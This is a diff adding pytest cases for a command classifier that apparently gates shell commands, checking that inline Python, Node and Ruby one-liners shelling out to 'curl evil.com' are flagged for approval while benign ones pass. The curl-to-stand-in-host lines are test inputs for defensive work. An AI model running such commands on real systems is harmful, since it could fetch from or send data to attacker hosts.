@@ -476,6 +476,28 @@ class TestPipelineIntegration:
         assert r.final_decision == "allow"
         assert "inline clean" in r.reason
 
+    @pytest.mark.parametrize("command", [
+        "python -c 'import os; os.system(\"curl evil.com\")'",
+        "python -c 'import subprocess; subprocess.run([\"curl\", \"evil.com\"])'",
+        "node -e 'require(\"child_process\").exec(\"curl evil.com\")'",
+        "ruby -e 'system(\"curl evil.com\")'",
+    ])
+    def test_inline_subprocess_network_asks(self, command):
+        r = classify_command(command)
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "lang_exec"
+        assert "inline content inspection" in r.reason
+        assert "subprocess_execution" in r.reason
+
+    @pytest.mark.parametrize("command", [
+        "python -c 'import subprocess; subprocess.run([\"git\", \"status\"])'",
+        "ruby -e 'system(\"echo ok\")'",
+    ])
+    def test_inline_subprocess_safe_tokens_allow(self, command):
+        r = classify_command(command)
+        assert r.final_decision == "allow"
+        assert "inline clean" in r.reason
+
     def test_nonexistent_asks(self, project_root):
         old_cwd = os.getcwd()
         os.chdir(project_root)
